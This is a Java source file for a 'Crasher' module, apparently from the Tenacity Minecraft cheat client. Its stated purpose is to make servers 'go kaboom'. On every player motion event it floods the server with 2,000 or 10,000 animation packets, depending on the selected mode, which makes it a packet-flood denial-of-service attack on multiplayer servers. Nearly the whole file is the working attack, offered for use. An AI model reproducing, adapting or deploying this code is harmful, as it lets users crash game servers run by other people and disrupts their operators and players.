package dev.tenacity.module.impl.exploit;

import dev.tenacity.event.IEventListener;
import dev.tenacity.event.impl.player.MotionEvent;
import dev.tenacity.module.Module;
import dev.tenacity.module.ModuleCategory;
import dev.tenacity.setting.impl.ModeSetting;
import dev.tenacity.util.misc.ChatUtil;
import dev.tenacity.util.misc.TimerUtil;
import io.netty.buffer.Unpooled;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C17PacketCustomPayload;

import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;
import java.io.*;
import java.lang.Thread;

public final class Crasher extends Module {

    private final TimerUtil timerUtil = new TimerUtil();

    private final ModeSetting mode = new ModeSetting("Mode", "Vanilla", "Boom");

    public Crasher() {
        super("Crasher", "Makes server go kaboom", ModuleCategory.EXPLOIT);
        initializeSettings(mode);
    }

    private final IEventListener<MotionEvent> onMotionEvent = event -> {
        switch(mode.getCurrentMode()) {
            case "Vanilla": {
                for (int i = 0; i < 2000; i++) {
                    mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
                }
                break;
            }
            case "Boom": {
                for (int i = 0; i < 10000; i++) {
                    mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
                }
                break;
            }

        }
    };
}